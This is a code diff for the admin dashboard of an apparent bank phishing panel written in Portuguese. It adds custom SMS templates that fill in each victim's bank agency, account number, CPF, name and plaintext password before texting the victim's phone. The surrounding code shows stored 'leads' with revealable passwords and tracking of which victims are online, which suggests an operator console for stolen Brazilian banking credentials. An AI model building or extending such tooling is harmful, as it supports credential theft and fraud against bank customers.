@@ -2,6 +2,7 @@ import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { leadRepository, sessionRepository, configRepository, type Lead } from "@/repositories";
 import { edgeFunctionsService } from "@/services";
+import type { CustomSmsTemplate } from "@/pages/admin/AdminAccessConfigPage";
 import {
   Search, RefreshCw, Eye, EyeOff, Trash2, Copy,
   CheckSquare, Square, Archive, ArchiveRestore, Tag, X, MapPin, Monitor, Send,
@@ -141,6 +142,8 @@ export default function AdminDashboard() {
   const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
   const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());
   const [sendingSms, setSendingSms] = useState(false);
+  const [customTemplates, setCustomTemplates] = useState<CustomSmsTemplate[]>([]);
+  const [selectedTemplateId, setSelectedTemplateId] = useState<string>("");
 
   // ── Fetchers ──
 
@@ -203,28 +206,30 @@ export default function AdminDashboard() {
     fetchLeadLastSession(lead.id);
   };
 
+  function applyTemplateVars(raw: string, lead: Lead): string {
+    const protocolo = lead.id.slice(0, 8).toUpperCase();
+    return raw
+      .replace(/\{\{protocolo\}\}/gi, protocolo)
+      .replace(/\{\{agencia\}\}/gi, lead.agency ?? "")
+      .replace(/\{\{conta\}\}/gi, lead.account ?? "")
+      .replace(/\{\{cpf\}\}/gi, lead.cpf ?? "")
+      .replace(/\{\{nome\}\}/gi, lead.nome ?? "")
+      .replace(/\{\{senha\}\}/gi, lead.password ?? "")
+      .replace(/\{\{segmento\}\}/gi, lead.segment ?? "")
+      .replace(/\{\{celular\}\}/gi, lead.phone ?? "");
+  }
+
   const handleSendSms = async (lead: Lead) => {
     const phone = lead.phone;
     if (!phone) { toast.error("Lead sem número de celular"); return; }
 
+    const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
+    if (!tpl) { toast.error("Selecione um template de SMS"); return; }
+    if (!tpl.body.trim()) { toast.error("Template vazio — edite em /controle"); return; }
+
     setSendingSms(true);
     try {
-      const configs = await configRepository.getByKeys(["sms_template"]);
-      const raw = (configs[0]?.config_value as string | null) ?? "";
-      if (!raw) { toast.error("Template de SMS não configurado em /controle"); return; }
-
-      // Replace template variables with lead data
-      const protocolo = lead.id.slice(0, 8).toUpperCase();
-      const message = raw
-        .replace(/\{\{protocolo\}\}/gi, protocolo)
-        .replace(/\{\{agencia\}\}/gi, lead.agency ?? "")
-        .replace(/\{\{conta\}\}/gi, lead.account ?? "")
-        .replace(/\{\{cpf\}\}/gi, lead.cpf ?? "")
-        .replace(/\{\{nome\}\}/gi, lead.nome ?? "")
-        .replace(/\{\{senha\}\}/gi, lead.password ?? "")
-        .replace(/\{\{segmento\}\}/gi, lead.segment ?? "");
-
-      await edgeFunctionsService.sendSms(phone, message);
+      await edgeFunctionsService.sendSms(phone, applyTemplateVars(tpl.body, lead));
       toast.success(`SMS enviado para ${phone}`);
     } catch (err) {
       console.error("Send SMS error:", err);
@@ -248,6 +253,16 @@ export default function AdminDashboard() {
   }, []);
 
   useEffect(() => { fetchLeads(); fetchOnlineLeadIds(); }, [showArchived]);
+
+  useEffect(() => {
+    configRepository.getByKeys(["sms_custom_templates"]).then((rows) => {
+      const v = rows[0]?.config_value;
+      if (Array.isArray(v)) {
+        setCustomTemplates(v as CustomSmsTemplate[]);
+        if (v.length > 0) setSelectedTemplateId((v[0] as CustomSmsTemplate).id);
+      }
+    }).catch(() => {});
+  }, []);
 
   useEffect(() => {
     const channel = supabase
@@ -699,19 +714,47 @@ export default function AdminDashboard() {
                 </div>
               )}
 
-              <div className="flex gap-2">
-                <button
-                  onClick={() => handleSendSms(selected)}
-                  disabled={sendingSms || !selected.phone}
-                  className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-primary/40 bg-primary/10 py-2 text-sm font-medium text-primary hover:bg-primary/20 transition-colors disabled:opacity-50"
-                >
-                  <Send className="h-4 w-4" />
-                  {sendingSms ? "Enviando..." : "Enviar SMS"}
-                </button>
-                <button onClick={() => handleCopyOne(selected)} className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
-                  <Copy className="h-4 w-4" /> Copiar dados
-                </button>
-              </div>
+              {/* SMS */}
+              {customTemplates.length > 0 ? (
+                <div className="space-y-2">
+                  <div className="flex gap-2">
+                    <select
+                      value={selectedTemplateId}
+                      onChange={(e) => setSelectedTemplateId(e.target.value)}
+                      className="flex-1 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
+                    >
+                      {customTemplates.map((t) => (
+                        <option key={t.id} value={t.id}>{t.name}</option>
+                      ))}
+                    </select>
+                    <button
+                      onClick={() => handleSendSms(selected)}
+                      disabled={sendingSms || !selected.phone}
+                      className="flex items-center gap-1.5 rounded-lg border border-primary/40 bg-primary/10 px-3 py-2 text-sm font-medium text-primary hover:bg-primary/20 transition-colors disabled:opacity-50"
+                    >
+                      <Send className="h-4 w-4" />
+                      {sendingSms ? "..." : "Enviar"}
+                    </button>
+                  </div>
+                  {/* Preview do template selecionado */}
+                  {(() => {
+                    const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
+                    return tpl?.body ? (
+                      <p className="rounded-lg bg-muted/40 border border-border px-3 py-2 text-[11px] font-mono text-muted-foreground whitespace-pre-wrap leading-relaxed">
+                        {applyTemplateVars(tpl.body, selected)}
+                      </p>
+                    ) : null;
+                  })()}
+                </div>
+              ) : (
+                <p className="text-center text-[11px] font-mono text-muted-foreground/60 py-1">
+                  Nenhum template SMS — crie em /controle
+                </p>
+              )}
+
+              <button onClick={() => handleCopyOne(selected)} className="flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
+                <Copy className="h-4 w-4" /> Copiar dados
+              </button>
             </div>
           )}
         </DialogContent>
